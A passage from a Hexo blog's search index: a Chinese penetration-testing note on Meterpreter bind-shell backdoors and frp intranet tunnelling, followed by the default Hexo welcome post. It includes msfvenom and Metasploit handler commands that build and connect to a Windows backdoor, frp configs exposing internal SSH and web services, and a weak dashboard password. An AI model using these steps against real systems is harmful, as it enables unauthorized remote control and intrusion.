<h2 id="使用Meterpreter实现正向连接"><a href="#使用Meterpreter实现正向连接" class="headerlink" title="使用Meterpreter实现正向连接"></a>使用Meterpreter实现正向连接</h2><h3 id="1、生成正向后门"><a href="#1、生成正向后门" class="headerlink" title="1、生成正向后门"></a>1、生成正向后门</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -f exe -o shell.exe</span><br></pre></td></tr></table></figure></div>

<h3 id="2、运行以下指令完成正向连接"><a href="#2、运行以下指令完成正向连接" class="headerlink" title="2、运行以下指令完成正向连接"></a>2、运行以下指令完成正向连接</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set lport 4444</span><br><span class="line">set rhost 192.168.112.160</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<h1 id="四、内网穿透-端口映射"><a href="#四、内网穿透-端口映射" class="headerlink" title="四、内网穿透-端口映射"></a>四、内网穿透-端口映射</h1><h2 id="使用frp进行端口映射"><a href="#使用frp进行端口映射" class="headerlink" title="使用frp进行端口映射"></a>使用frp进行端口映射</h2><h3 id="1、SSH服务"><a href="#1、SSH服务" class="headerlink" title="1、SSH服务"></a>1、SSH服务</h3><p>(1)在公网服务器上，配置<code>frps.ini</code>，并使用<code>./frps -c ./frps.ini</code>命令启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000  	# frp服务端端口（必须）</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>后台启动：$ nohup.&#x2F;frps-c frps.ini &amp;</p>
</blockquote>
<p>(2)配置内网客户端frpc.ini</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 47.96.116.171		# frp服务端地址，可以填ip或者域名，这里假设为0.0.0.0</span><br><span class="line">server_port = 7000		# frp服务端端口，即填写服务端配置中的bind_port</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type = tcp		# 连接类型，填tcp或udp</span><br><span class="line">local_ip = 127.0.0.1	# 填127.0.0.1或内网ip都可以</span><br><span class="line">local_port = 22		# 需要转发到的端口，ssh端口是22</span><br><span class="line">remote_port = 8082		# frp服务端的远程监听端口，即你访问服务端的remote_port就相当于访问客户端的local_port,如果填0则会随机分配一个端口，而7000的端口是对外显示的（隐藏真实的端口关系？）</span><br></pre></td></tr></table></figure></div>

<p>(3)在任意其他主机上，使用“<code>ssh -p 8082 root@47.96.116.171</code>“直接可以访问到内网Linux。</p>
<h3 id="2、HTTP服务"><a href="#2、HTTP服务" class="headerlink" title="2、HTTP服务"></a>2、HTTP服务</h3><p>(1)在公网服务器上，配置<code>frps.ini</code>，并使用<code>./frps-c./frps.ini</code>命令启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 8080</span><br></pre></td></tr></table></figure></div>

<p>(2)在为公网IP配置域名解析<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/8b255818a2441bd8ce9aeea99c1e5921.png"
                      alt="8b255818a2441bd8ce9aeea99c1e5921.png"
                ></p>
<p>(3)确认云服务器防火墙规则</p>
<p>(4)在Windows2016上启动<code>frpc.exe -c frpc.ini</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 47.96.116.171</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_port = 80</span><br><span class="line">custom_domains = frp.matrika.cn</span><br></pre></td></tr></table></figure></div>

<h3 id="3、开启Dashboard"><a href="#3、开启Dashboard" class="headerlink" title="3、开启Dashboard"></a>3、开启Dashboard</h3><p>编辑服务器端frps.ini</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 8080</span><br><span class="line"></span><br><span class="line">dashboard_port =8081		</span><br><span class="line"># 注意端口要经过公网防火墙配置（注意不能包含在真正的配置文件中）</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = 123456</span><br></pre></td></tr></table></figure></div>

<p>访问：<a href="http://4796.116.171:8081/static/#/">http://4796.116.171:8081/static/#/</a> ,输入用户名和密码<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/9224ffea073e7e5bff89bc8811e3d545.png"
                      alt="9224ffea073e7e5bff89bc8811e3d545.png"
                ></p>
<h1 id="五、临时开启http服务"><a href="#五、临时开启http服务" class="headerlink" title="五、临时开启http服务"></a>五、临时开启http服务</h1><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\ppp\Desktop&gt; python -m http.server</span><br><span class="line">Serving HTTP on :: port 8000 (http://[::]:8000/) ...</span><br><span class="line">::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] code 404, message File not found</span><br><span class="line">::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/08/15/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
</search>
